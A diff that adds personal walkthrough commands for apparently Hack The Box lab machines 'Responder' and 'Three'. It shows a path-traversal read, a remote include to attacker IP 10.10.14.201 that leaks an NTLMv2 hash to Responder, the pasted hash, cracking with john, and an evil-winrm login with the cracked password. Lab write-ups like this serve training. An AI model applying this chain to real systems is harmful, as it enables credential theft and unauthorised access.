@@ -82,5 +82,26 @@ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt --
 ## Responder
 
 ```shell
+sudo nmap -sN -A <ip_address>
+<ip_address>
+echo "<ip_address> unika.htb" >> /etc/hosts
+# http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+sudo responder -I tun0
+# http://unika.htb/index.php?page=//10.10.14.201/file
+echo " Administrator::RESPONDER:9edb562faa3ed546:DDB8D25C0B447C1AA3C01E830C713738:010100000000000080C00D5464CADC019BAC598CCADDBE2F0000000002000800460037005A004F0001001E00570049004E002D004500350041004A004A0057005500340045004A00510004003400570049004E002D004500350041004A004A0057005500340045004A0051002E00460037005A004F002E004C004F00430041004C0003001400460037005A004F002E004C004F00430041004C0005001400460037005A004F002E004C004F00430041004C000700080080C00D5464CADC0106000400020000000800300030000000000000000100000000200000BC712D28AD8E105EBEC3ED565C5A255D4A2A4525B4771A13985237135675DF2B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300031000000000000000000" >> responder.txt
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt responder.
+sudo evil-winrm -U Administrator -p badminton -i <ip_address>
+cd C:\Users\mike\Desktop
+type flag.txt
+```
+
+## Three
+
+```shell
+sudo nmap -sN -A <ip_address>
+echo "<ip_address> thetoppers.htb" >> /etc/hosts
+sudo wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u <ip_address>/
+s3.thetoppers.htb
+sudo apt-get install awscli -y
 
 ```
